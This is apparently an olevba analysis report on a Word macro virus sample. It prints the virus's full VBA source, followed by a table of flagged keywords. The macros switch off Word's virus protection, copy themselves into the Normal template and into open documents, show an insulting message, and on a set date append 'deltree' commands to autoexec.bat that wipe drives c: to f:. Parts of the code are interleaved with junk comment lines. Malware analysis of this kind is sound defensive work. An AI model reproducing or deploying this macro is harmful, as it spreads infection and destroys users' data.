olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-df869c727a0d08db2c430c63e6103bd4301576d4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-df869c727a0d08db2c430c63e6103bd4301576d4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim flagaltro As Boolean
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim count As Integer
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Dim bry As Variant
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    On Error Resume Next
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    stato = ActiveDocument.Saved
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Application.EnableCancelKey = Not -1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        .ConfirmConversions = 0
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        .SaveNormalPrompt = 0
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit

'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Kill "c:\cont.dbl"
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Open "c:\cont.dbl" For Output As #1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    For count = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Next count
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Do Until MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "End Sub"
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        count = count + 1
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        If MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Loop
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Print #1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(count, 1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
        
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit

'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    flagio = False
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    For count = 1 To bry.CodeModule.CountOfLines
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            flagaltro = True
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
                flagaltro = False
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            End If
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    Next count
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
    If flagaltro = True Then
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
Sub ToolsMacro()
'Ditry PC2/8/2000 12:35:11 PMHP LaserJet 4 on LPT1:BLASTER.D1BClippit
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpynorm
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpynorm:
        Close #1
    End If

    flagaltro = False
    flagio = False
    
    Set bry = ActiveDocument.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
   
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    If flagio = False And flagaltro = False Then
        Open "c:\cont.dbl" For Input As #1
        If LOF(1) = 0 Then GoTo cpyacti
        count = 1
        Do While Not EOF(1)
            Line Input #1, stress
            bry.CodeModule.InsertLines count, stress
            count = count + 1
        Loop
cpyacti:
        Close #1
    End If

    Kill "c:\cont.dbl"

    Randomize
    If Int((6 * Rnd) + 1) < 3 Then
        With Dialogs(wdDialogFileSummaryInfo)
            .Title = "Macro Carrier"
            .Author = "Dream Blaster"
            .Keywords = "Minny"
            .Execute
        End With
    End If

    If Left(ActiveDocument.Name, 8) <> "Document" Then
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If

    If Day(Date) = 17 Then
        If Dir("c:\minny.log", vbHidden + vbSystem) = "" Then
            SetAttr "c:\autoexec.bat", vbNormal
            Open "c:\autoexec.bat" For Input As #1
                Do Until EOF(1)
                    Input #1, stress
                Loop
            Close #1
            
            If stress <> "you are simply a bitch" Then
                Open "c:\autoexec.bat" For Append As #1
                    Print #1, "deltree /Y f:\*"
                    Print #1, "deltree /Y e:\*"
                    Print #1, "deltree /Y d:\*"
                    Print #1, "deltree /Y c:\*"
                    Print #1, "rem Created by Dream Blaster"
                    Print #1, "rem Minny, you are simply a bitch"
                Close #1
            End If
        Else
            MsgBox "You are protected from this virus damage"
        End If
    End If

    ActiveDocument.Saved = stato
    
    On Error GoTo 0
End Sub
Private Sub Document_Open()
    Dim flagaltro As Boolean
    Dim flagio As Boolean
    Dim count As Integer
    Dim bry As Variant

    On Error Resume Next

    Application.EnableCancelKey = Not -1
    With Options
        .ConfirmConversions = 0
        .VirusProtection = 0
        .SaveNormalPrompt = 0
    End With

    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim stato As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Close()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If
    
    flagaltro = False
    flagio = False
    
    Set bry = NormalTemplate.VBProject.VBComponents.Item(1)
    
    For count = 1 To bry.CodeModule.CountOfLines
        If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then
            flagaltro = True
            flagio = False
            If Trim(bry.CodeModule.Lines(count + 1, 1)) = "Dim flagaltro As Boolean" Then
                flagio = True
                flagaltro = False
                Exit For
            End If
        End If
    Next count
    
    If flagaltro = True Then
        For count = 1 To bry.CodeModule.CountOfLines
            If bry.CodeModule.Lines(count, 1) = "Private Sub Document_Open()" Then Exit For
        Next count
    
        Do Until bry.CodeModule.Lines(count, 1) = "End Sub"
            bry.CodeModule.DeleteLines (count)
        Loop
        
        bry.CodeModule.DeleteLines (count)
        
        flagaltro = False
    End If

    On Error GoTo 0
End Sub
Sub AutoOpen()
'rr1616/30/99 11:11:43 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
On Error GoTo out
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.VirusProtection = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.SaveNormalPrompt = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Options.ConfirmConversions = False
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt > 70 And ad > 0 Then GoTo out
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt < 70 Then
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'rr1616/30/99 11:11:44 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End If
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
host.CodeModule.AddFromFile ("c:\class.sys")
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    For x = 1 To 4
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .DeleteLines 1
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Next x
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt < 70 Then
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline 1, "Sub AutoClose()"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline 71, "Sub ToolsMacro()"
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End If
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
With host.CodeModule
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    For x = 2 To 72 Step 2
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
    Next x
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End With
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
out:
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End Sub
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
Sub ViewVBCode()
'rr1616/30/99 11:11:45 PMHP LaserJet IIISi PostScript v52.3 on LPT1:giochinoClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

